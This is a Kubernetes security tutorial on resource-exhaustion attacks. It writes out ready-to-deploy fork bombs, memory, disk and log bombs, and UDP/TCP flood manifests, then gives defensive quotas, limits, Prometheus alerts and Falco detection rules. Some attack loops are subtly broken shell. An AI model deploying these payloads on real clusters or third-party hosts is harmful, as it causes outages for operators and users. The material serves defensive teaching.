# Resource Exhaustion DoS Attacks in Kubernetes

## Context & Problem

**Business Problem**: Resource exhaustion attacks in Kubernetes can bring down entire clusters, cause cascading failures across services, and result in significant revenue loss and customer impact through denial of service conditions.

**Real-World Impact**:
- **Service unavailability**: Complete application downtime affecting customers
- **Cascading failures**: Resource exhaustion causing node failures and multi-service outages
- **Financial impact**: Lost revenue, SLA violations, and potential penalty clauses
- **Operational overhead**: Emergency response, incident management, and recovery costs
- **Reputation damage**: Customer trust erosion and competitive disadvantage

## First Principles: Understanding Resource Exhaustion in Kubernetes

### Resource Types and Attack Vectors
```
CPU Exhaustion → Node Overload → Pod Eviction → Service Degradation
Memory Bomb → OOM Killer → Node Instability → Cluster Failure
Storage Attack → Disk Full → Pod Creation Failure → Application Outage
Network Flood → Bandwidth Saturation → Communication Failure → Isolation
```

### Why Kubernetes Amplifies DoS Impact
1. **Shared Resources**: Multiple tenants share node resources
2. **Cascading Effects**: One compromised pod can affect entire node
3. **Scheduler Vulnerability**: Resource requests bypass can overwhelm scheduler
4. **Control Plane Impact**: API server can become unresponsive under load
5. **Cross-Service Dependencies**: Service mesh amplifies resource consumption

### Attack Progression Patterns
```
1. Initial Compromise → Gain pod access
2. Resource Discovery → Identify resource limits/quotas
3. Evasion Techniques → Bypass resource controls
4. Amplification → Launch resource bombs
5. Persistence → Maintain attack despite restarts
6. Lateral Impact → Spread to other nodes/services
```

## Production Implementation: Resource Exhaustion Attack Scenarios

### Scenario 1: CPU Exhaustion Attack (Fork Bomb)

#### Vulnerable Deployment without Resource Limits
```yaml
# WARNING: Dangerous configuration - for educational purposes only
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-no-limits
  namespace: resource-attack-demo
spec:
  replicas: 3
  selector:
    matchLabels:
      app: cpu-vulnerable
  template:
    metadata:
      labels:
        app: cpu-vulnerable
    spec:
      containers:
      - name: app
        image: ubuntu:20.04
        command: ["/bin/bash"]
        args: ["-c", "while true; do echo 'Normal app behavior'; sleep 10; done"]
        # ❌ VULNERABILITY: No resource limits
        # ❌ VULNERABILITY: No resource requests
        # ❌ VULNERABILITY: Can consume unlimited CPU
```

#### CPU Exhaustion Attack Payload
```bash
# Inside compromised container - CPU fork bomb attack
cat << 'EOF' > /tmp/cpu-bomb.sh
#!/bin/bash
# CPU Exhaustion Attack - generates maximum CPU load

echo "Launching CPU exhaustion attack..."

# Method 1: Classic fork bomb
:(){ :|:& };:

# Method 2: Multiple CPU intensive processes
for i in {1..$(nproc)}; do
    yes > /dev/null &
done

# Method 3: Stress testing tool simulation
while true; do
    dd if=/dev/zero of=/dev/null &
done

wait
EOF

chmod +x /tmp/cpu-bomb.sh
/tmp/cpu-bomb.sh
```

#### Kubernetes Deployment for CPU Attack
```yaml
# Simulated compromised application launching CPU attack
apiVersion: batch/v1
kind: Job
metadata:
  name: cpu-attack-job
  namespace: resource-attack-demo
spec:
  parallelism: 5  # Launch on multiple nodes
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: cpu-bomb
        image: ubuntu:20.04
        command: ["/bin/bash"]
        args:
        - -c
        - |
          echo "Normal application startup..."
          sleep 5
          echo "Launching CPU exhaustion attack!"
          
          # Fork bomb
          :(){ :|:& };: &
          
          # CPU intensive loops
          for i in {1..$(nproc)}; do
            while true; do
              echo "CPU_LOAD_GENERATOR" > /dev/null
            done &
          done
          
          # Keep container alive
          sleep infinity
        # ❌ No resource limits = unlimited CPU consumption
```

### Scenario 2: Memory Bomb Attack

#### Memory Exhaustion Attack Payload
```yaml
# Memory bomb deployment
apiVersion: batch/v1
kind: Job
metadata:
  name: memory-bomb-attack
  namespace: resource-attack-demo
spec:
  parallelism: 3
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: memory-bomb
        image: python:3.9-slim
        command: ["python3"]
        args:
        - -c
        - |
          import time
          import os
          
          print("Starting memory exhaustion attack...")
          
          # Method 1: Rapid memory allocation
          memory_blocks = []
          block_size = 100 * 1024 * 1024  # 100MB blocks
          
          try:
              while True:
                  # Allocate memory rapidly
                  block = 'X' * block_size
                  memory_blocks.append(block)
                  print(f"Allocated {len(memory_blocks) * 100}MB")
                  
                  # Small delay to avoid immediate detection
                  time.sleep(0.1)
          except MemoryError:
              print("Memory exhausted!")
              time.sleep(3600)  # Keep container alive
        # ❌ No memory limits = can consume all node memory
---
# Alternative memory attack using shell
apiVersion: batch/v1
kind: Job
metadata:
  name: shell-memory-bomb
  namespace: resource-attack-demo
spec:
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: shell-bomb
        image: alpine:latest
        command: ["/bin/sh"]
        args:
        - -c
        - |
          echo "Shell-based memory bomb attack"
          
          # Create large files in memory
          mount -t tmpfs -o size=100g tmpfs /tmp
          
          # Fill memory with large files
          for i in {1..1000}; do
            dd if=/dev/zero of=/tmp/bigfile$i bs=1M count=100 &
          done
          
          # Alternative: Use /dev/shm
          for i in {1..100}; do
            head -c 1G </dev/urandom >/dev/shm/memfile$i &
          done
          
          wait
```

### Scenario 3: Storage Exhaustion Attack

#### Disk Space Bomb
```yaml
# Storage exhaustion attack
apiVersion: batch/v1
kind: Job
metadata:
  name: storage-bomb-attack
  namespace: resource-attack-demo
spec:
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: storage-bomb
        image: alpine:latest
        command: ["/bin/sh"]
        args:
        - -c
        - |
          echo "Starting storage exhaustion attack..."
          
          # Method 1: Fill disk with large files
          for i in {1..1000}; do
            dd if=/dev/zero of=/tmp/bigfile$i bs=1M count=1000 2>/dev/null &
          done
          
          # Method 2: Rapid small file creation
          for i in {1..100000}; do
            echo "Storage bomb file $i" > /tmp/file$i &
          done
          
          # Method 3: Log bomb
          while true; do
            echo "LOG_SPAM_ATTACK_$(date): $(openssl rand -hex 1000)" >> /tmp/logbomb.log
          done
        volumeMounts:
        - name: host-storage
          mountPath: /host
        # ❌ Attack can fill host filesystem
      volumes:
      - name: host-storage
        hostPath:
          path: /tmp
```

### Scenario 4: Network Resource Exhaustion

#### Network Bandwidth Saturation
```yaml
# Network flood attack
apiVersion: apps/v1
kind: Deployment
metadata:
  name: network-flood-attack
  namespace: resource-attack-demo
spec:
  replicas: 10
  selector:
    matchLabels:
      app: network-flood
  template:
    metadata:
      labels:
        app: network-flood
    spec:
      containers:
      - name: network-bomb
        image: alpine:latest
        command: ["/bin/sh"]
        args:
        - -c
        - |
          apk add --no-cache curl netcat-openbsd hping3
          
          echo "Starting network flood attack..."
          
          # Method 1: HTTP flood to internal services
          while true; do
            for service in kubernetes.default.svc.cluster.local; do
              curl -s $service & 
            done
            sleep 0.1
          done &
          
          # Method 2: UDP flood
          while true; do
            echo "UDP_FLOOD_PAYLOAD" | nc -u -w1 8.8.8.8 53 &
            sleep 0.01
          done &
          
          # Method 3: TCP SYN flood simulation
          while true; do
            nc -z 10.0.0.1 80 &
            sleep 0.01
          done
        # ❌ No network policies = unrestricted network access
```

## Troubleshooting Scenarios: "What happens when this breaks at 2AM?"

### Crisis Scenario 1: Node Resource Exhaustion
```bash
# Symptoms: Nodes showing NotReady status
kubectl get nodes
kubectl describe node <node-name> | grep -A 10 Conditions

# Investigation: Check resource usage
kubectl top nodes
kubectl top pods --all-namespaces --sort-by=cpu
kubectl top pods --all-namespaces --sort-by=memory

# Identify resource bombs
kubectl get pods --all-namespaces --field-selector=status.phase=Running -o wide
for pod in $(kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{"\n"}{end}'); do
    echo "=== $pod ==="
    kubectl exec -n $(echo $pod | cut -d'/' -f1) $(echo $pod | cut -d'/' -f2) -- ps aux | head -5
done

# Emergency response: Identify and terminate resource-intensive pods
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{.spec.containers[0].resources.limits}{"\n"}{end}' | grep -v limits

# Scale down deployments without resource limits
kubectl get deployments --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{"\n"}{end}' | while read dep; do
    if ! kubectl get deployment $dep -o jsonpath='{.spec.template.spec.containers[0].resources.limits}' | grep -q memory; then
        kubectl scale deployment $dep --replicas=0
        echo "Scaled down $dep (no resource limits)"
    fi
done
```

### Crisis Scenario 2: API Server Overload
```bash
# Symptoms: kubectl commands timing out
kubectl version --short  # Check if API server responds

# Investigation: Check API server logs
kubectl logs -n kube-system kube-apiserver-<master-node> | tail -100

# Check for excessive requests
kubectl get events --all-namespaces --sort-by=.metadata.creationTimestamp | tail -50

# Emergency API server protection
# Implement rate limiting (if not already configured)
cat << EOF > /tmp/api-server-limits.yaml
apiVersion: flowcontrol.apiserver.k8s.io/v1beta2
kind: FlowSchema
metadata:
  name: emergency-rate-limit
spec:
  matchingPrecedence: 1000
  priorityLevelConfiguration:
    name: limited
  rules:
  - subjects:
    - kind: ServiceAccount
      serviceAccount:
        name: "*"
        namespace: "resource-attack-demo"
    resourceRules:
    - verbs: ["*"]
      resources: ["*"]
EOF

kubectl apply -f /tmp/api-server-limits.yaml
```

### Crisis Scenario 3: Cluster-Wide Service Degradation
```bash
# Check cluster health
kubectl cluster-info
kubectl get componentstatuses

# Identify cascading failures
kubectl get pods --all-namespaces | grep -E "(Pending|CrashLoopBackOff|Error)"

# Check node pressure conditions
kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.status.conditions[?(@.type=="MemoryPressure")].status}{"\t"}{.status.conditions[?(@.type=="DiskPressure")].status}{"\t"}{.status.conditions[?(@.type=="PIDPressure")].status}{"\n"}{end}'

# Emergency cluster recovery
# 1. Drain affected nodes
kubectl drain <affected-node> --ignore-daemonsets --delete-emptydir-data

# 2. Implement emergency resource quotas
cat << EOF | kubectl apply -f -
apiVersion: v1
kind: ResourceQuota
metadata:
  name: emergency-quota
  namespace: resource-attack-demo
spec:
  hard:
    requests.cpu: "0"
    requests.memory: "0"
    limits.cpu: "0"
    limits.memory: "0"
EOF

# 3. Delete problematic namespace
kubectl delete namespace resource-attack-demo
```

## Evolution & Alternatives: Resource Protection and Limits

### Modern Resource Management Stack

#### Layer 1: Resource Quotas and Limits
```yaml
# Comprehensive resource management
apiVersion: v1
kind: Namespace
metadata:
  name: production-app
  labels:
    resource-tier: "production"
---
# Namespace-level resource quota
apiVersion: v1
kind: ResourceQuota
metadata:
  name: production-quota
  namespace: production-app
spec:
  hard:
    requests.cpu: "4"
    requests.memory: "8Gi"
    limits.cpu: "8"
    limits.memory: "16Gi"
    persistentvolumeclaims: "10"
    pods: "20"
    services: "5"
    secrets: "10"
    configmaps: "10"
---
# Pod-level resource limits
apiVersion: v1
kind: LimitRange
metadata:
  name: production-limits
  namespace: production-app
spec:
  limits:
  # Container defaults and limits
  - default:
      cpu: "500m"
      memory: "512Mi"
    defaultRequest:
      cpu: "100m"
      memory: "128Mi"
    max:
      cpu: "2"
      memory: "4Gi"
    min:
      cpu: "50m"
      memory: "64Mi"
    type: Container
  # Pod limits
  - max:
      cpu: "4"
      memory: "8Gi"
    type: Pod
  # PVC limits
  - max:
      storage: "10Gi"
    type: PersistentVolumeClaim
```

#### Layer 2: Secure Application with Resource Constraints
```yaml
# Production-ready application with proper resource management
apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-web-app
  namespace: production-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: secure-web-app
  template:
    metadata:
      labels:
        app: secure-web-app
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        runAsGroup: 3000
        fsGroup: 2000
        seccompProfile:
          type: RuntimeDefault
      containers:
      - name: web-app
        image: nginx:1.25-alpine
        ports:
        - containerPort: 8080
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          runAsNonRoot: true
          capabilities:
            drop:
            - ALL
            add:
            - NET_BIND_SERVICE
        resources:
          requests:
            memory: "128Mi"
            cpu: "100m"
            ephemeral-storage: "100Mi"
          limits:
            memory: "256Mi"
            cpu: "200m"
            ephemeral-storage: "200Mi"
        livenessProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 30
          periodSeconds: 10
          timeoutSeconds: 5
          failureThreshold: 3
        readinessProbe:
          httpGet:
            path: /ready
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 5
          timeoutSeconds: 3
          failureThreshold: 2
        volumeMounts:
        - name: tmp-volume
          mountPath: /tmp
        - name: cache-volume
          mountPath: /var/cache/nginx
        env:
        - name: MAX_CONNECTIONS
          value: "100"
        - name: WORKER_PROCESSES
          value: "2"
      volumes:
      - name: tmp-volume
        emptyDir:
          sizeLimit: "100Mi"
      - name: cache-volume
        emptyDir:
          sizeLimit: "50Mi"
      terminationGracePeriodSeconds: 30
```

#### Layer 3: Pod Disruption Budgets and Autoscaling
```yaml
# Pod Disruption Budget for availability
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: web-app-pdb
  namespace: production-app
spec:
  minAvailable: 2
  selector:
    matchLabels:
      app: secure-web-app
---
# Horizontal Pod Autoscaler
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: web-app-hpa
  namespace: production-app
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: secure-web-app
  minReplicas: 3
  maxReplicas: 20
  metrics:
  - type: Resource
    resource:
      name: cpu
      target:
        type: Utilization
        averageUtilization: 70
  - type: Resource
    resource:
      name: memory
      target:
        type: Utilization
        averageUtilization: 80
  behavior:
    scaleUp:
      stabilizationWindowSeconds: 60
      policies:
      - type: Percent
        value: 100
        periodSeconds: 15
    scaleDown:
      stabilizationWindowSeconds: 300
      policies:
      - type: Percent
        value: 10
        periodSeconds: 60
---
# Vertical Pod Autoscaler (optional)
apiVersion: autoscaling.k8s.io/v1
kind: VerticalPodAutoscaler
metadata:
  name: web-app-vpa
  namespace: production-app
spec:
  targetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: secure-web-app
  updatePolicy:
    updateMode: "Auto"
  resourcePolicy:
    containerPolicies:
    - containerName: web-app
      minAllowed:
        cpu: 50m
        memory: 64Mi
      maxAllowed:
        cpu: 1
        memory: 1Gi
```

### Advanced Resource Monitoring and Alerting

#### Resource Monitoring with Prometheus
```yaml
# Prometheus rules for resource exhaustion detection
apiVersion: monitoring.coreos.com/v1
kind: PrometheusRule
metadata:
  name: resource-exhaustion-alerts
  namespace: monitoring
spec:
  groups:
  - name: resource-exhaustion
    rules:
    
    # High CPU usage alert
    - alert: HighCPUUsage
      expr: rate(container_cpu_usage_seconds_total[5m]) * 100 > 80
      for: 2m
      labels:
        severity: warning
        type: resource-exhaustion
      annotations:
        summary: "High CPU usage detected"
        description: "Container {{ $labels.container }} in pod {{ $labels.pod }} is using {{ $value }}% CPU"
    
    # High memory usage alert  
    - alert: HighMemoryUsage
      expr: (container_memory_working_set_bytes / container_spec_memory_limit_bytes) * 100 > 85
      for: 2m
      labels:
        severity: warning
        type: resource-exhaustion
      annotations:
        summary: "High memory usage detected"
        description: "Container {{ $labels.container }} is using {{ $value }}% of memory limit"
    
    # Node resource pressure
    - alert: NodeResourcePressure
      expr: kube_node_status_condition{condition="MemoryPressure",status="true"} == 1
      for: 1m
      labels:
        severity: critical
        type: node-pressure
      annotations:
        summary: "Node under memory pressure"
        description: "Node {{ $labels.node }} is experiencing memory pressure"
    
    # Rapid pod creation (potential attack)
    - alert: RapidPodCreation
      expr: increase(kube_pod_created[5m]) > 50
      for: 1m
      labels:
        severity: warning
        type: potential-attack
      annotations:
        summary: "Rapid pod creation detected"
        description: "{{ $value }} pods created in last 5 minutes"
    
    # Resource quota exhaustion
    - alert: ResourceQuotaExhausted
      expr: (kube_resourcequota_used / kube_resourcequota_hard) * 100 > 90
      for: 1m
      labels:
        severity: warning
        type: quota-exhaustion
      annotations:
        summary: "Resource quota nearly exhausted"
        description: "Namespace {{ $labels.namespace }} {{ $labels.resource }} quota is {{ $value }}% full"
```

#### Runtime Detection with Falco
```yaml
# Falco rules for resource attack detection
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-resource-rules
data:
  resource-rules.yaml: |
    - rule: Resource Bomb Detection
      desc: Detect processes that rapidly consume resources
      condition: >
        spawned_process and
        (proc.name in (yes, dd, stress, stress-ng) or
         proc.cmdline contains "while true" or
         proc.cmdline contains "for i in" or
         proc.cmdline contains ":(){ :|:& };:")
      output: >
        Potential resource bomb detected
        (container=%container.name process=%proc.name cmdline=%proc.cmdline)
      priority: ERROR
      
    - rule: Memory Allocation Spike
      desc: Detect rapid memory allocation
      condition: >
        spawned_process and
        (proc.name contains "python" or proc.name contains "java") and
        proc.cmdline contains "memory"
      output: >
        Potential memory bomb detected
        (container=%container.name process=%proc.name cmdline=%proc.cmdline)
      priority: WARNING
      
    - rule: High Process Creation Rate
      desc: Detect fork bombs and rapid process creation
      condition: >
        spawned_process and
        proc.pname in (bash, sh, zsh) and
        proc.cmdline contains "&"
      output: >
        High process creation rate detected
        (container=%container.name parent=%proc.pname process=%proc.name)
      priority: WARNING
```

## Next Steps: Building Resilient Resource Management

### Production-Ready Resource Security

#### 1. Implement Comprehensive Resource Policies
```bash
# Deploy resource management stack
kubectl apply -f resource-quotas.yaml
kubectl apply -f limit-ranges.yaml
kubectl apply -f pod-disruption-budgets.yaml

# Verify resource limits
kubectl describe resourcequota --all-namespaces
kubectl describe limitrange --all-namespaces
```

#### 2. Set Up Monitoring and Alerting
```bash
# Deploy monitoring stack
kubectl apply -f prometheus-rules.yaml
kubectl apply -f falco-resource-rules.yaml

# Test alerts
kubectl port-forward -n monitoring svc/alertmanager 9093:9093
```

#### 3. Regular Resource Auditing
```bash
# Audit script for resource management
#!/bin/bash
echo "=== Resource Management Audit ==="

echo "Namespaces without resource quotas:"
kubectl get namespaces -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' | while read ns; do
    if ! kubectl get resourcequota -n $ns >/dev/null 2>&1; then
        echo "  $ns"
    fi
done

echo "Deployments without resource limits:"
kubectl get deployments --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{"\n"}{end}' | while read dep; do
    if ! kubectl get deployment $dep -o jsonpath='{.spec.template.spec.containers[0].resources.limits}' | grep -q memory; then
        echo "  $dep"
    fi
done
```

### Business Impact Measurement
- **Availability**: Prevent service outages and maintain SLAs
- **Performance**: Ensure consistent application performance under load
- **Cost**: Optimize resource utilization and prevent waste
- **Security**: Protect against DoS attacks and resource abuse
- **Scalability**: Enable predictable scaling behavior

**Production Reality**: Resource exhaustion attacks can bring down entire Kubernetes clusters and cause significant business impact. Implementing comprehensive resource management with quotas, limits, monitoring, and alerting is essential for production resilience.